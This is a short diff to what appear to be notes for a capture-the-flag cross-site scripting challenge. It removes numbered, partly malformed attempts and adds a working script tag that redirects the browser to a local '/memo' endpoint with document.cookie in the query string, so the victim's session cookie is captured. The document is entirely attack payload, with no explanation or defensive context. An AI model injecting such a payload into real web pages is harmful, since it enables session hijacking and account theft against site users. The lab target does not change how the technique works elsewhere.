@@ -1,14 +1,4 @@
-1. redirect to main page.
-window.location.href = "http://127.0.0.1:8000";
+<script>
+window.location.href = `http://127.0.0.1:8000/memo?memo=${document.cookie}`
+</script>
 
-2. change memo tag
-document.querySelector('body > div > p:nth-child(2) > a').href = `/memo?memo=${document.cookie}`;
-
-3. move to memo
-document.querySelector('body > div > p:nth-child(2) > a').click();
-
-asyn (() => {
-  await window.location.href = "http://127.0.0.1:8000";
-  document.querySelector('body > div > p:nth-child(2) > a').href = `/memo?memo=${document.cookie}`;
-  document.querySelector('body > div > p:nth-child(2) > a').click();
-})();
